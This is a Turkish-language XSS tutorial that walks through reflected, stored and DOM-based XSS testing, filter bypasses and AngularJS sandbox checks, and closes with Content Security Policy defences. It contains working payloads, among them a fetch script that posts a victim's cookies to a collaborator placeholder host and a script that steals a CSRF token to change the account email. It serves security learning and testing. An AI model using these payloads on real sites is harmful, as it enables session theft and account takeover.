### Cross-site Scripting (XSS) Nedir?

Cross-site scripting (XSS), web uygulamalarında görülen bir güvenlik açığıdır. Bu açık, saldırganların kurban kullanıcıyla uygulama arasındaki etkileşimi ele geçirmesine olanak tanır. XSS açıkları sayesinde saldırgan, kurban gibi davranabilir, onun yetkileriyle işlem yapabilir ve verilerine erişebilir. Eğer kurban kullanıcı uygulamada yetkili biriyse, saldırgan tüm sistemi ele geçirebilir.

### XSS Nasıl Çalışır?

Saldırgan, güvenlik açığı olan bir siteyi manipüle ederek kullanıcıya zararlı JavaScript kodu döndürmesini sağlar. Bu kod kurbanın tarayıcısında çalıştığında, saldırgan uygulama üzerindeki etkileşimi tamamen ele geçirebilir.

## XSS Türleri Nelerdir?

Cross-site scripting (XSS) saldırıları genel olarak üç ana kategoriye ayrılır:

1. **Reflected XSS (Yansıtılan XSS)**
2. **Stored XSS (Depolanmış XSS)**
3. **DOM-based XSS (DOM Tabanlı XSS)**

Her bir türün çalışma şekli farklıdır ve hedef alınan zafiyetin konumuna göre değişiklik gösterir.

---
### 1. Reflected XSS 

Reflected XSS, en temel XSS türüdür. Bu saldırı türü, kullanıcının yaptığı bir HTTP isteğindeki zararlı verinin, herhangi bir filtreleme veya doğrulama yapılmadan, doğrudan yanıtın içinde kullanıcıya geri döndürülmesiyle ortaya çıkar.

Örnek : `https://website.com/status?message=visitor`

tarayıcıda elde edilen görüntü :

`<h2>Hello Visitor</h2>`

Eğer uygulama gelen message parametresini filitrelemeden HTML içerisine yerleştiriyorsa, saldırgan şu şekilde bir bağlantı oluşturabilir.

`https://website.com/status?message=<script>alert(1)</script>`

Bu da tarayıcının Javascript kodunu çalıştırmasına olanak sağlar.

### Manuel Reflected XSS Test Süreci

####  Adım 1: Giriş Noktalarını Tespit Et

İlk olarak, uygulamaya gönderilen tüm HTTP isteklerinde **veri giriş noktaları** tespit edilmeli:

- URL parametreleri (query string)
- POST body içerikleri
- URL path parametreleri (`/search/query`)
- HTTP header’ları (`User-Agent`, `Referer`, `X-Forwarded-For`, `Host`, vb.)

> ⚠ Not: Sadece bazı header’lar üzerinden tetiklenen XSS’ler **pratikte istismar edilemeyebilir**, çünkü son kullanıcı bu değerleri doğrudan kontrol edemez.
####  Adım 2: Benzersiz Alfanumerik Değerler Enjekte Et

Her giriş noktasına 8 karakter uzunluğunda **benzersiz bir alfanumerik değer** enjekte et. Örneğin:
`abc123xy`

Bu değerin yeterince kısa olması, filtrelere takılmamasını sağlar; yeterince uzun olması ise yanıtlarda rastlantısal olarak bulunma ihtimalini düşürür.
#### Adım 3: Yansıma Kontekstini Belirle

Girdiğin değer yanıt içerisinde yansıyorsa, bu değerin **hangi bağlamda** yer aldığını incele:

| Kontekst           | Örnek                              |
| ------------------ | ---------------------------------- |
| HTML body (içerik) | `<p>abc123xy</p>`                  |
| HTML attribute     | `<input value="abc123xy">`         |
| JavaScript string  | `var data = "abc123xy";`           |
| URL                | `<a href="search.php?q=abc123xy">` |
Bağlam, kullanacağın payload’ın türünü doğrudan belirler.

#### Adım 4: Aday Payload Testi Yap

Bağlama uygun **bir XSS payload’ı** dene. Örneğin:

- HTML body: `<script>alert(1)</script>`
- HTML attribute: `" onmouseover="alert(1)`
- JS string: `";alert(1);//`
#### Adım 5: Alternatif Payload’lar Deneyerek Filtre Bypass Et

Bazı durumlarda uygulama, payload’ını filtreleyebilir veya değiştirebilir. Bu durumda, bağlama göre farklı teknikleri denemelisin:

- HTML encode edilmiş karakterlerle (`<` yerine `%3C`)
- Event handler tabanlı payload’lar (`<img src=x onerror=alert(1)>`)
- SVG veya MathML kullanımı
- `script`, `iframe`, `body`, `details`, `a`, `object` gibi farklı HTML etiketleri
- JavaScript URL’leri (`javascript:alert(1)`)
**Son Adım olarak Payload'ı bir tarayıcıda test etmektir.**

---
### 2. Stored XSS (Depolanmış XSS)

Stored XSS, aynı zamanda **kalıcı XSS** olarak da bilinir. Bu saldırı türünde, zararlı kod bir defa sisteme yerleştirilir ve sonrasında birçok kullanıcıyı etkileyebilir. Zararlı veri genellikle veritabanında, günlüklerde veya başka kalıcı depolama alanlarında saklanır ve daha sonra kullanıcıya sunulurken filtrelenmeden gösterilir.
#### Örnekler:

- Bir blog sitesine yapılan yorumlar
- Forum gönderileri
- Canlı sohbet kullanıcı adları
- Sipariş formlarındaki müşteri notları

Bir post örneği :
```http
POST /post/comment HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 100 

postId=3&comment=This+is+awesome.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

Comment kısmındaki yazıyı zafiyetli bir kodla değiştirdiğimizde sistemde kalıcı olarak bir web zafiyeti oluşmuş olur.

#### Manuel Stored XSS Test Süreci

Stored XSS açıklarını bulmak, Reflected XSS’e göre daha zordur çünkü zararlı veri uygulamada bir yerde **saklanır** ve daha sonra farklı bir kullanıcıya **başka bir sayfada** gösterilir.

**1. Giriş Noktaları:**  
– URL parametreleri ve body içeriği  
– URL dosya yolu  
– HTTP header'ları  
– E-posta, sosyal medya içerikleri, API verileri gibi dış kaynaklı veri girişleri (örneğin: e-mail sistemi, RSS feed)

**2. Çıkış Noktaları:**  
– Uygulamanın herhangi bir sayfasında son kullanıcıya gösterilen içerikler  
– Örneğin: kullanıcı profili, admin paneli, log kayıtları, yorum bölümleri

**3. Giriş ve çıkış ilişkisini belirle:**  
Her giriş noktasına **kendine özgü ve rastgele bir değer** gönderilir (örneğin: `xss12345`) ve bu değerin daha sonra başka bir yerde görünüp görünmediği kontrol edilir. Eğer değer daha sonraki bir sayfada görünüyorsa ve sayfa değiştikten sonra da kalıyorsa, veri büyük ihtimalle **sunucuda saklanmıştır.**

**4. Bağlantı tespit edildikten sonra test yapılır:**  
Verinin bulunduğu yerin **HTML içindeki konumu** (context) analiz edilir. Uygun XSS payload’ları denenir (örneğin: `<script>alert(1)</script>`). Payload çalışıyorsa, Stored XSS mevcuttur.

**Reflected XSS’e benzer şekilde test yapılır ama farkı, bu verinin başka bir sayfa ve zamanda görünmesidir.**

---
### 3. DOM-based XSS (DOM Tabanlı XSS)

DOM-based XSS, diğer XSS türlerinden farklı olarak, sunucu tarafında değil, doğrudan tarayıcıda yani istemci tarafındaki JavaScript kodunda gerçekleşir. Bu durumda saldırgan, tarayıcıdaki JavaScript’in kullanıcıdan aldığı veriyi yanlış şekilde işlemesini sağlar.
#### DOM-based XSS'nin Özellikleri:

- Genellikle URL parametreleri, `window.location`, `document.referrer` gibi kaynaklardan veri çekilir.
- Sunucu tarafında hiçbir işleme gerek kalmadan yalnızca tarayıcıda gerçekleşir.
- Tespiti zor, etkisi büyük olabilir.
#### DOM-based XSS Tespiti

**Genel Dom based xss testi**

URL parametrelerinden gelen girdilerle DOM tabanlı XSS testi yapmak için:
- URL parametresine özgün bir değer (`domtest9876`) yerleştirilir.
- Burp Tarayıcının geliştirici araçları kullanılarak bu değerin DOM'da hangi elemanlarda göründüğü incelenir.
- Değerin kullanıldığı noktada innerHTML, document.write, eval gibi zararlı JavaScript fonksiyonları varsa, XSS için sömürü potansiyeli değerlendirilir.

Ancak bazı DOM XSS türleri yalnızca `document.cookie`, `localStorage`, `setTimeout()` gibi **HTML dışı kaynaklardan** veya **HTML dışı işlemlerle** tetiklenir. Bu tarz durumlar için en etkili yol, JavaScript kaynak kodunun **manuel olarak incelenmesidir**. Fakat bu oldukça zaman alıcı olabilir.


**HTML Sinks Testi:**  
İlk olarak, sayfanın JavaScript kodlarının hangi kaynakları (`location`, `document.URL`, vs.) kullandığını kontrol etmek gerekir. Kaynağa rastgele bir string (`xss12345`) yerleştirilir ve bu string sayfanın DOM’una düşüyor mu diye bakılır. Sayfa kaynağını (`View Source`) görmek yeterli değildir; çünkü DOM manipülasyonu sadece geliştirici konsolunda görünür. Chrome'da **Elements sekmesinde Ctrl+F** ile string aranır.

Eğer string DOM'da bir yere düştüyse, bulunduğu **kontekst analiz edilir**. Örneğin bir HTML attribute’un içinde mi, bir elementin içinde mi, yoksa bir script tag’ine mi yazılmış? Buna göre XSS payload'ları denenir. (örnek: çift tırnak içine düştüyse `"><script>alert(1)</script>` gibi payloadlar denenebilir.)

Ayrıca bazı tarayıcılar `location.search` veya `location.hash` gibi kaynakları **otomatik olarak encode** eder. Bu durumda XSS çalışmaz. Örneğin Chrome encode ederken eski Internet Explorer sürümleri encode etmez. Bu farklılıklar da test aşamasında göz önünde bulundurulmalıdır.

**JavaScript Execution Sinks Testi:**  
Bazı durumlarda DOM XSS’in izi DOM üzerinde görünmez çünkü veri doğrudan `eval()`, `setTimeout()`, `innerHTML`, `document.write()` gibi sink fonksiyonlara aktarılır. Bu durumda doğrudan sayfa içeriğinde bir iz göremezsiniz. Yapmanız gereken şey, geliştirici araçlarındaki **Sources** sekmesinde JavaScript kodunu analiz etmektir.

Chrome’da **Ctrl+Shift+F** ile `location`, `document.URL`, vs. gibi kaynakların sayfada nerelerde kullanıldığını arayın. Kaynak bir değişkene atanıyorsa, o değişkeni de takip edin ve nereye aktarıldığına bakın. Eğer bir sink fonksiyona gidiyorsa, **breakpoint** koyarak içeriği adım adım izleyin. Böylece zararlı payload’lar ile bu fonksiyonların tetiklenip tetiklenmediğini test edebilirsiniz.

**Dom XSS örnek:** 
Bu senaryoda, Sayfada doğrudan kullanıcı girdisi alınan bir input bulunmuyor. Fakat kullanıcılara bir ürünün farklı şehirlerdeki stok durumunu kontrol etme imkânı veren bir form mevcut.

Uygulamanın JavaScript kodu dikkatlice incelendiğinde, görünürde olmayan başka bir veri kaynağının da işlendiği fark ediliyor:

`var store = (new URLSearchParams(window.location.search)).get('storeId');`

Bu satır, URL'den `storeId` parametresini alıyor ve sayfaya `<select>` öğesi içerisinde yeni bir `<option>` olarak yazıyor. İlgili tüm JavaScript kodu şu şekilde:

```js
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```

Burada kritik nokta, `document.write` fonksiyonunun kullanıcı tarafından kontrol edilebilen `storeId` parametresini filtreleme yapmadan doğrudan HTML'e yazmasıdır. Bu durum DOM tabanlı bir XSS (Cross-Site Scripting) zafiyeti doğurur.

Bu açığı sömürmek için URL kısmına şöyle bir payload eklenebilir.
`"></select><img src=x onerror=alert(1)>`
Bu payload, önce `<select>` elementini kapatır, ardından sayfaya zararlı `<img>` etiketi yerleştirerek JavaScript çalıştırır. Bu sayede XSS başarıyla tetiklenir.

####   jQuery gibi kütüphanelerde DOM XSS:

1.**location.search kaynağında href özelliği**
Modern web uygulamaları, jQuery gibi üçüncü parti kütüphaneleri sıkça kullanır. Bu kütüphaneler, DOM XSS açısından hem veri kaynağı (source) hem de veri işleme noktası (sink) olabilir. Örneğin, jQuery'nin `attr()` fonksiyonu bir DOM elemanının özelliğini kullanıcı kontrollü bir veriyle değiştiriyorsa, XSS riski doğar:

```js
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
```
Burada `returnUrl` parametresi zararlı bir `javascript:alert(document.domain)` URI’siyle değiştirilirse, bağlantıya tıklanmasıyla XSS çalışır. Bu yüzden sadece kendi yazdığınız kodu değil, dış kütüphanelerin kullandığı kaynak ve sink’leri de dikkatle incelemek gerekir.

2.**Jquery $() seçim fonksiyonu:**

jQuery’nin `$()` selector fonksiyonu da DOM XSS için tehlikeli bir sink olabilir. Özellikle `location.hash` gibi kullanıcı kontrollü verilerle kullanıldığında, saldırganın zararlı içerik enjekte etmesi mümkün hale gelir. Bu durum genellikle hashchange event'i ile tetiklenir:

```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

Eski jQuery sürümleri, hash ile başlayan verilerle HTML enjekte edilmesine izin veriyordu. Yeni sürümler bu açığı yamamış olsa da, hâlâ eski kodlar canlı sistemlerde bulunabilir. Bu açığı tetiklemek için kullanıcı etkileşimi gerektirmeyen bir yöntem olarak iframe kullanılabilir:

`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`

Bu iframe yüklenince hash değeri değiştirilir ve hashchange event'i tetiklenerek XSS çalıştırılır.
####  AngularJS ile DOM XSS

**1. ng-app çift şekilli parantez içinde çalışan XSS :** AngularJS, HTML elementlerinde bulunan `ng-app` gibi direktifleri tarayarak içeriği yorumlayan bir JavaScript framework’üdür. Özellikle `{{...}}` şeklindeki ifadelerle **JavaScript ifadeleri çalıştırmak** mümkündür.
##### Güvenlik Açığının Temeli

Uygulamanın arama fonksiyonunda, kullanıcıdan alınan veri doğrudan bir AngularJS direktifi olan `ng-app` içindeki HTML'e yansıtılıyor. Bu durumda, `{{...}}` içinde yazılan ifadeler AngularJS tarafından **JavaScript kodu olarak değerlendirilir**. XSS zafiyetini tetiklemek için yazılabilecek payload:
`{{$on.constructor('alert(1)')()}}`

Açıklama :
- `$on` AngularJS’nin `$scope` objesindeki bir fonksiyondur.
- `constructor` kullanılarak, JavaScript'in Function constructor’ı çağrılır.
- `'alert(1)'` argümanı bu constructor’a verilerek çalıştırılır.
- Parantez sonundaki `()` fonksiyonun çağrılmasını sağlar.
- 
Bu sayede, AngularJS ifadesi çalıştırılarak DOM üzerinden **XSS açığı tetiklenmiş olur**. Bu saldırı modeli, özellikle AngularJS 1.x sürümlerinde ve kullanıcı girdisinin doğrudan `{{...}}` içine yerleştirildiği durumlarda etkilidir.

##### Eval() fonksiyonu ile  reflected XSS:
kod:
```js
if (this.readyState == 4 && this.status == 200) {
    eval('var searchResultsObj = ' + this.responseText);
    displaySearchResults(searchResultsObj);}
```
Burada `this.responseText` sunucudan dönen ham JSON metni. Normalde bu metin şöyle başlar:
`{"results":[],"searchTerm":"id:3...."}`

Ve `eval` şu savunmasız satırı çalıştırır:
`{"results":[],"searchTerm":"\\" -alert(1)}//"}`

Payload’un Yapısı: `" -alert(1)}//`
- İlk karakter olarak `\"` (ters eğik + çift tırnak)  
    Sunucunun döndürdüğü JSON muhtemelen `{"foo":"bar",…}` formunda. Biz önce `"bar"` kısmını kesip kendi kodumuzu enjekte etmek için **çift tırnağı** kapatıyoruz.
- Devamında `-alert(1)`  
    Burada `-` basitçe geçerli bir ayrıştırıcı (separator) olarak çalışıyor; önemli olan hemen ardından gelen `alert(1)` çağrısı.
- Sonra `}`  
    Bu, açtığımız JSON obje literalini kapatıyor.
- Ve `//`  
    Geriye kalan potansiyel JSON yapısını yorum satırı haline getirip pasifize ediyoruz; böylece `eval` satırının devamı bir söz dizimi hatası oluşturmaz.
En son olarak : `var searchResultsObj = "-alert(1)}//";` bu şekilde gözükür.

##### Replace() fonksiyonu bypass: 
`<` karakterlerinin HTML etiketlerini aşmasını engellemek için yorum metnine gelen tüm `<` işaretlerini `replace("<", "&lt;")` ile dönüştürmek için kullanılması sıkıntılara yol açabiliyor. Görünürde makul bir önlem gibi duruyor, ancak JavaScript’te
`commentText.replace("<", "&lt;")`
ifadeleri sadece ilk eşleşmeyi değiştirir ve sonradan gelen `< >` gibi karakterler olduğu gibi bırakılır.
bypass olarak da şöyle çalışabiliriz.
`<><img src=1 onerror=alert(1)>` ile önce ilk gelen `<>` karakterleri aşıp kodun çalışmasını sağlıyoruz.

```js
 let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
firstPElement.innerHTML = newInnerHtml
```

innerHTML ile başka filtreleme olmadan direkt html içerisine yazdırıldığından javascript kodları çalışıyor.

### Dom XSS de bilinmesi gerekenler :

1. **`innerHTML` ile `<script>` etiketinin çalışmaması:**
		- Modern tarayıcılar, `innerHTML` kullanılarak DOM'a eklenen `<script>` etiketlerini **yürütmezler**.
		- Bu, XSS saldırılarında `innerHTML` sink'inin kolayca kullanılmasını engellemek içindir.
		- Tarayıcılar innerHTML ile gelen `<script>` 'leri sadece **HTML olarak** kabul eder ama **çalıştırmaz**. Yani DOM'a girer ama çalışmaz.
2.

---
### XSS Payload örnekleri :

#### 1- Reflected Between HTML tag:

1- 1. Reflected XSS - Iframe + `onresize` Tetikleyicisi:

`<iframe src="https://website.com/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

XSS payloadının çalışması için onresize ile sayfa boyutunun değişikliğinin yapılması gerekiyor. Web site iframe açabildiğinden iframe üzerinden otomatik boyutunu değiştiriyoruz.
	
**2-`onfocus` + `hash` Payload:**
`<script> location = 'https://website.com/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>`

iframe ile olduğu gibi script ile de payload çalıştırılmasını sağlayabiliriz. Burada `<xss>` tagı ile custom payload oluşturuyoruz. 
- `search=<xss id=x ...>`: DOM'a odaklanabilir (`tabindex=1`) bir element enjekte edilir.
- `onfocus=alert(...)`: Bu elemana odaklanıldığında XSS çalışır.
- `#x`: Hash ile otomatik olarak `id="x"` olan elemana odaklanılır.

**3-  `SVG + animate` Payload:**
`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>`

"SVG etiketi, `animate`, `attributeName` ve `values` gibi öznitelikleri (attribute) veya olayları (event) kullanabiliyor. Hem `<a>` hem de `<svg>` etiketi birlikte kullanılarak XSS payload'u başarılı şekilde tetiklenebiliyor."

**4- SVG + animatetransform + onbegin Payload:**
`<svg><animatetransform onbegin=alert(1)>` 
"SVG etiketi, animatetransform özniteliği ile beraber onbegin olayını tetikliyor. onbegin ise alert(1) fonksiyonunu çalıştırıyor. animatetransform olmadan "

**5- Kurbanın cookie'sini ele geçirmek:**
```html
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```
Cookieleri collabrator ile ele geçirme işlemi fetch ile yapıyoruz.

**6- Kurbanın e-postasını CSRF tokenini de alarak  e-posta değiştirme :** 
```html
<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send(); 
function handleResponse()
{ var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest(); 
changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; 
</script>
```


#### 2- HTML tag öznitelikleri içerisinde XSS zafiyet örnekleri:

**1- <,> encode edilmiş. sadece tag içerisinde eklemeye izin var :**
`"onmouseover="alert(1) ve "onfocus="alert(1)` 

**2- Her şey encode edilmiş ama tıklanılabilir bir a taginin href bağlantısına yazabilirsin.** 
`javascript:alert`

**3-Access key ile XSS payloadı :**
`?'accesskey='x'onclick='alert(1)` Access key gizli bir parametre olarak sitelerde var olabiliyor. özelliği ise belirlenen karaktere basıldığında bir işlevi gerçekleştirmesidir. Denenebilir.

---
#### 3- Javascript içerisindeki XSS Payload örnekleri:

**1- Bir Javascript verisinin içerisine dahil olma :**
`var searchTerns = ''`  searchvalue kısmından aldığı veriyi bu kısıma yazıyor. Bu kısımda payloadın dışına çıkıp herhangi bir javascript ifade çalıştırmayı denediğimde örnek :`'-alert(1)-'` şeklinde `'` tek tırnak ifadesini `\'` escape ediyor. Fakat payloadı değiştirip `</script><img src=1 onerror=alert(document.domain)>` şeklinde yazdığımızda script tagi burada HTML parsing davranışından dolayı script tagi kendini kapattı sanıyor ve string'den çıkıyor. sonra da img etiketi ile xss payloadını çalıştırıyor. 

Buradaki kilit soru : Neden`</script>`tarayıcı tarafından string değil de HTML olarak yorumlanıyor?

Cevap: Tarayıcıların HTML parse etme mantığıyla ilgili. Bu bir JavaScript değil, HTML parsing davranışıdır. Tarayıcı, `<script>` bloğu içindeyken karşısına `</script>` çıktığı anda script bloğunun bittiğini düşünür.  Bu ifade ister string'in içinde olsun, ister comment içinde olsun, fark etmez.


**2- Escape edilmeden Javascript kodunun içerisine dahil olma :**
`'-alert(1)-'` mümkün oluyor. Çünkü yapı `'` tek tırnağı escape etmiyor, filteremiyor veya encode etmiyor. Eğer escape ediyor olsaydı farklı yöntemler denememiz gerekebilirdi:
 Girdi :
 `';alert(document.domain)//` böyle yazdığımızda bize şöyle dönecekti  
 Çıktı :
  `\';alert(document.domain)//`  
  
  peki slash ile beraber yazar isek ? 

Girdi : 
`\';alert(document.domain)//`
Çıktı :
`\\';alert(document.domain)//` çift slash ile bir önceki slash'ı escape edecek ve string'i tek tırnak ile kapatacaktı. Bazı durumlarda \ karakterini de escape etmek için \ ekleniyor bu durumda işe yaramayacaktır.

**3- Parantez olmadan alert():** 

**4- HTML encoding ile escape edip payloadı çalıştırma :**
`<a href="#" onclick="... var input='controllable data here'; ...">`
Böyle bir javascript kodunda onclick eventinde input kısmından çıkmak için html encode'yi kullanıyoruz. Peki html encode neden burada işe yarıyor ? aynı şeyi href içerisine de yazıyor fakat href içerisinden çıkamıyoruz neden ? Çünkü onclick eventi JavaScript içerir. İçeriği tarayıcı çalıştırmadan önce HTML decode eder. Bu yüzden HTML entity ile gelen zararlı JS çalışabilir.
`&apos;-alert(document.domain)-&apos;`

**5- Template literal XSS :**
double back tick yani çift ters tırnak işareti ile kullanılan stringlere template literal denir.
`var message = `0 search results for 'test'`;` Kodun içerisine dahil olduğu yer `test` alanıdır.

${alert(document.domain)} payload olarak direkt hiçbir şey escape etmeden yazıyoruz çünkü :
Template literal içinde` ${...}`yazarsan, bu kısım **doğrudan JavaScript olarak çalıştırılır.** Kapatmaya veya string bozucu karakter kullanmaya gerek yoktur. Bu nedenle`${alert(document.domain)}` ifadesi tarayıcıda yorumlanır ve XSS gerçekleşir.

---
### CSTI ile XSS zafiyetleri :
CSTI zafiyetleri adından da anlaşılacağı üzere istemci taraflı şablonlarda çalışmaktadır. Bu templatelerden birisi de AngularJS olarak geçer. Örneklerimizi bunun üzerinde yapacağız.  
Öncelikle AngularJS sandbox ne olduğunu öğrenmemiz lazım. Çünkü bu sistem versiyon 1.6 ya kadar kullanılıyordu ve güvenlik araştırmacıları bunu atlatmanın bir yöntemini buldular. AngularJS de basit işlemlerin yapılabilmesi için {{}} operatörünü ortaya çıkarmıştır. Fakat bu operatör kötüye kullanılıp XSS gibi zafiyetlere yol olmuştur. Geliştiriciler bunu engellemek için sanbox sistemini eklemeye karar vermişlerdir. Sandbox ise her nesneden geçerek ensureSafeObject ile kontrole tabi tutuyor.  Ayrıca küresel değişkenlere de erişimi önler. Ayrıca ensureSafeObject gibi birkaç benzer fonksiyon vardır;

* ensureSafeObject Eğer nesne constructor fonksiyonu, windows objesi, Dom elementi veya constructor objesi ise  yürütmeyi bırakır.

* EnsureSafeMemberName : Bir JavaScript özelliğini kontrol eder ve `.constructor`, `__proto__`, `__lookupGetter__` gibi **yasaklı property adlarını** kontrol eder.

* EnsureSafeFunction:  `call`,`apply`,`bind` ,`constructor Function` komutlarını çağırıp çağırmadığını kontrol eder.

---
## Güvenlik Önlemleri: Content Security Policy (CSP)

#### CSP Nedir ?
**CSP**, tarayıcıya “bu sayfada neyin çalıştırılmasına izin veriyorum, neye vermiyorum” demeyi sağlayan bir **güvenlik mekanizmasıdır.** Özellikle **XSS (Cross-Site Scripting)** saldırılarına karşı bir önlem olarak kullanılır. CSP sayesinde hangi kaynaklardan script yüklenebileceği, hangi DOM işlemlerine izin verileceği gibi kurallar belirlenebilir. 
## Nasıl Çalışır:

Sunucu, HTTP response header’ına şu şekilde bir satır ekler:
```http
Content-Security-Policy: script-src 'self'
```
Bu örnekte, sayfa sadece kendi domaininden (`'self'`) script yükleyebilir. Yani dışarıdan gelen `<script src="http://evil.com/xss.js">` gibi şeyler **engellenir.**
## CSP Direktifleri

CSP, birçok **“direktif”** içerir. Bunlardan bazıları:

- `script-src`: Script’ler nereden yüklenebilir?
- `img-src`: Resimler nereden yüklenebilir?
- `default-src`: Yukarıdakiler tanımlı değilse genel kaynak kuralı
- `style-src`, `connect-src`, `frame-src`, vs...

Örnek:
```http
Content-Security-Policy: default-src 'none'; script-src 'self' https://trustedcdn.com; img-src *;
```

Burada yapılan işlem :
- Tüm kaynaklara **default olarak izin vermez** (`default-src 'none'`)
- Script’lere sadece `self` ve `trustedcdn.com` üzerinden izin verir.
- Tüm img URL’lerine izin verir (`img-src *`)

## Nonce ve Hash Kullanımı

Inline script’ler genellikle CSP tarafından engellenir. Ama bazı istisnalar var:
### Nonce
```html
Content-Security-Policy: script-src 'nonce-abc123'

<script nonce="abc123">alert(1)</script>
```
Her sayfa yüklemesinde nonce farklı olmalı.
### Hash:
`Content-Security-Policy: script-src 'sha256-AhYz...'`
Script içeriğinin hash’i CSP’de tanımlanır. Eğer birebir eşleşirse çalıştırılır.


Önemli CSP bilgileri :
* Eğer inline `<script>alert(1)</script>` bile varsa CSP onu da engelleyebilir. Yani **inline XSS’leri de engeller.**

* **Not:** `script-src 'self'` yazsan bile `<script>alert(1)</script>` gibi inline script’ler çalışmaz. Çünkü CSP’de `'unsafe-inline'` yoksa inline script'ler **engellenir.**

* Nonce değeri sistemler arası değil, sayfa içerisinde çalışacak scriptin tanımalaması içindir. sayfa yüklenirken `<script>` tagine özel olur.

* Büyük CDN'ler `ajax.googleapis.com` CSP açısından zararlıdır çünkü : Büyük CDN’ler (örneğin `ajax.googleapis.com`) birçok kullanıcıya hizmet verir. 
  Eğer attacker CDN üzerinde kontrol ettiği bir dosyayı yükleyebiliyorsa (örneğin başka bir siteye script koyuyorsa), sen de bu CDN’e `script-src` izni verdiysen, attacker XSS payload’unu **"güvenilir" görünen CDN üzerinden** yükleyebilir.

*  ` Content-Security-Policy: default-src 'none'; img-src 'self'; script-src 'sha256-AbCd123...';` Bunun açıklaması :
	* - **Tüm kaynaklar yasak (default-src 'none')**
	- **img** sadece `'self'`ten
	- **script** sadece **hash**’i eşleşen inline script’ler

### CSP Direktifleri ve Anlamları (Kısa Kısa)

| Direktif      | Anlamı                                                                                      |
| ------------- | ------------------------------------------------------------------------------------------- |
| `default-src` | Belirtilmeyen tüm kaynak türlerinin varsayılan kaynağı. (Örn: font, frame, img, script vs.) |
| `script-src`  | JavaScript dosyalarının nereden yüklenebileceğini belirler.                                 |
| `style-src`   | CSS dosyalarının nereden yükleneceğini belirler.                                            |
| `img-src`     | Resimlerin nereden yükleneceğini belirler.                                                  |
| `font-src`    | Fontların nereden yükleneceğini belirler.                                                   |
| `connect-src` | AJAX, WebSocket, Fetch gibi bağlantıların yapılabileceği kaynaklar.                         |
| `media-src`   | Video, ses gibi medyanın yükleneceği yerler.                                                |
| `frame-src`   | `<iframe>` kaynakları. Nereden embed yapılabilir.                                           |
| `object-src`  | `<object>`, `<embed>` veya `<applet>` gibi öğelere izin verilecek kaynaklar.                |
| `base-uri`    | `<base>` tag'ine izin verilecek yer.                                                        |
| `form-action` | `<form action="">` ile veri gönderilebilecek yerler.                                        |
### CSP Anahtar Değerler:
|Değer|Anlamı|
|---|---|
|`'self'`|Sayfanın kendi domain’i|
|`'none'`|Hiçbir yerden izin verilmez|
|`'unsafe-inline'`|Inline script ve style’lara izin verilir (tehlikeli)|
|`'unsafe-eval'`|`eval()` gibi dinamik kodlara izin verilir (tehlikeli)|
|`'strict-dynamic'`|Dinamik olarak eklenen script’lere izin verilir (script chaining)|
|`'nonce-<random>'`|Script’lere verilen tek kullanımlık rastgele token|
|`'sha256-xyz...'`|Belirli bir hash’e sahip inline script’lere izin verir|